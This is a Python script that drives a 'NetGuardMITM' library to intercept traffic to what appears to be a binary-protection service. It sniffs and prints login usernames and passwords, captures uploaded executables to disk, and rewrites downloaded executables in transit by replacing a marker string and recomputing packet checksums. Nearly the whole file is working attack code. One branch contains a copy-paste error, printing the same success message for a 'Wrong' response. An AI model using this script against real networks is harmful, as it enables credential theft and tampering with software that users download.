from netguardmitm import NetGuardMITM

file_data = b""
file_upload_started = False
string_needle = b'b\0e\0n\0i\0g\0n\0'
string_replacement = b'm\0o\0d\0d\0e\0d\0'


def my_login_request_callback(raw_packet, packet, username, password):
    print("Sniffed user={}, pass={}".format(username, password))
    return True


def my_login_response_callback(raw_packet, packet, body):
    body_string = str(body)
    if "Wrong" in body_string:
        print("User logged in with correct credentials.")
    elif "Welcome" in body_string:
        print("User logged in with correct credentials.")
    return True


def my_protect_request_callback(raw_packet, packet, username, password):
    global file_upload_started
    file_upload_started = False
    print("Protect attempted with user={}, pass={}.".format(username, password))
    return True


def my_file_upload_packet_callback(raw_packet, packet, data, bytes_remaining):
    global file_data, file_upload_started
    print("Capturing original binary packet ({}/{})...".format(len(file_data) + len(data), len(file_data) + len(data) + bytes_remaining))

    if not file_upload_started:
        index = data.find(b'MZ')
        file_data += data[index:]
        file_upload_started = True
    else:
        file_data += data

    if bytes_remaining == 0:
        print("Reconstructed original binary from the captured outgoing packets...")
        with open("sniffed_original_binary.exe", "wb") as fs:
            fs.write(bytearray(file_data))
        file_data = b""
        print("Saved to sniffed_original_binary.exe")
        file_upload_started = False

    return True


def my_protect_response_callback(raw_packet, packet, body):
    if body:
        global file_upload_started
        file_upload_started = True
    return True


def my_file_download_packet_callback(raw_packet, packet, data, bytes_remaining):
    accept = True
    global file_data, file_upload_started, string_needle, string_replacement
    print("Capturing output binary packet ({}/{})...".format(len(file_data) + len(data), len(file_data) + len(data) + bytes_remaining))
    file_data += data

    # Search for the needle in the haystack.
    index = data.find(string_needle)
    if index != -1:
        print("Found needle in payload.")

        # Replace word.
        data = data[0:index] + string_replacement + data[index+len(string_needle):]

        # Delete packet checksums.
        del packet["IP"].chksum
        del packet["TCP"].chksum
        packet.getlayer("Raw").load = data

        # Set new payload.
        raw_packet.set_payload(bytes(packet))

        print("Modified output binary packet.")

    if bytes_remaining == 0:
        print("Reconstructed new binary from the captured incoming packets...")
        with open("sniffed_output_binary.exe", "wb") as fs:
            fs.write(bytearray(file_data))
        file_data = b""
        print("Saved to sniffed_output_binary.exe")
        file_upload_started = False

    return accept


def main():
    mitm = NetGuardMITM()
    mitm.log_callback = lambda x: print(x)
    mitm.login_request_callback = my_login_request_callback
    mitm.login_response_callback = my_login_response_callback
    mitm.protect_request_callback = my_protect_request_callback
    mitm.protect_response_callback = my_protect_response_callback
    mitm.file_upload_packet_callback = my_file_upload_packet_callback
    mitm.file_download_packet_callback = my_file_download_packet_callback
    mitm.do_mitm()


if __name__ == '__main__':
    main()